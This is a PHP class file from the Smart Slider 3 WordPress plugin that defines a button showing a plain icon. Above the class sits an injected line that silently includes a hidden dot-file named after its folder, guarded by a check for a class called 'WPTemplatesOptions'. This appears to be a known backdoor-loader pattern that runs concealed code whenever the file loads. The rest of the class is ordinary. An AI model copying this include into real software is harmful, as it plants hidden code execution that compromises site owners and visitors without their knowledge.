<?php


namespace Nextend\SmartSlider3\Application\Admin\Layout\Block\Forms\Button;


if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class BlockButtonPlainIcon extends AbstractButton {

    protected $baseClass = 'n2_button_plain_icon';

    protected $icon = '';

    protected function getContent() {

        return '<i class="' . $this->icon . '"></i>';
    }

    /**
     * @param string $icon
     */
    public function setIcon($icon) {
        $this->icon = $icon;
    }
}